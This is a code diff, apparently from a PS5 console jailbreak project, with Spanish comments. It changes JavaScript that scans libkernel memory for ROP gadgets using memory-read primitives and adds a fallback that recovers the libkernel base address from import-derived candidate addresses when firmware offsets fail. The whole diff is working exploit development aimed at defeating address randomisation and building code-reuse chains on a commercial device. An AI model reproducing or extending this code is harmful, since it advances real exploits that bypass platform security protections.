@@ -229,12 +229,14 @@
     }
     function scanGadgets() {
         const g = {};
+        const kbase = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+            ? PS5.libkernelBase : ctx.libkernelBase;
         const CHUNK = 0x2000, OVER = 16;
         for (let off = 0; off < KTEXT; off += CHUNK) {
             // cada chunk se extiende OVER bytes mas alla para no perder
             // gadgets que cruzan la frontera
-            const mem = rdBytes(ctx.libkernelBase + off, lenFor(off));
-            const memBase = ctx.libkernelBase + off;
+            const mem = rdBytes(kbase + off, lenFor(off));
+            const memBase = kbase + off;
             for (const k in GADPAT) {
                 if (g[k] !== undefined && g[k] !== null) continue;
                 const f = findPat(mem, memBase, GADPAT[k]);
@@ -268,12 +270,18 @@
             catch (e) { return null; }
         })();
         if (qp === "0") { PS5.notes.push("rop-forced-direct"); return false; }
-        if (!(ctx.libkernelBase > 0x800000000 && ctx.libkernelBase < 0x900000000)) {
-            PS5.notes.push("rop-no-libkernel-base");
+        const base = (PS5.libkernelBase > 0x800000000 && PS5.libkernelBase < 0x900000000)
+            ? PS5.libkernelBase : ctx.libkernelBase;
+        if (!(base > 0x800000000 && base < 0x900000000)) {
+            // Causa mas comun en firmwares interpolados: el exploit no valido el
+            // libkernel base (offsets gps/cls/ers no coinciden) y publico base
+            // no valida. Se anota el valor real para diagnostico en panel/log.
+            PS5.notes.push("rop-no-libkernel-base:" + HEX(base || 0)
+                + " (offsets 13.x no validaron)");
             return false;
         }
         try {
-            const v = ctx.aim(ctx.libkernelBase);   // 1 byte: primer byte de .text
+            const v = ctx.aim(base);   // 1 byte: primer byte de .text
             if (v === null || v === undefined) {
                 PS5.notes.push("rop-probe-null");
                 return false;
@@ -379,6 +387,27 @@
         PS5.fw = c.fw;
         PS5.webkitBase = c.webkitBase;
         PS5.libkernelBase = c.libkernelBase;
+        // [Mods consola] Diagnostico de offsets: si la base publicada esta fuera
+        // de banda, revisar las candidatas por import (getpid/close/error). Si
+        // una cae en banda y alineada, se registra y se usa para el escaneo:
+        // asi un solo offset interpolado erroneo no mata el modo ROP.
+        try {
+            const kb = c.libkernelBase;
+            const inBand = (x) => x > 0x800000000 && x < 0x900000000 && (x % 0x4000 === 0);
+            if (!inBand(kb) && c.kernelBaseCandidates) {
+                const cds = c.kernelBaseCandidates;
+                const list = [["getpid", cds.getpid], ["close", cds.close], ["error", cds.error]];
+                PS5.notes.push("kbase-candidates:"
+                    + list.map(([n, v]) => n + "=" + HEX(v)).join(","));
+                for (const [n, v] of list) {
+                    if (inBand(v)) {
+                        PS5.notes.push("kbase-recovered-from:" + n + "=" + HEX(v));
+                        PS5.libkernelBase = v;
+                        break;
+                    }
+                }
+            }
+        } catch (e) { PS5.notes.push("kbase-diag-threw:" + String(e.message || e).slice(0, 40)); }
         heapPtr = 0x2000; heapEnd = 0x8000; chainBase = 0x8000;
         PS5.mallocEnd = heapEnd;
         // cabecera sanity: la arena debe ver el centinela "ROP1" en +0xf00
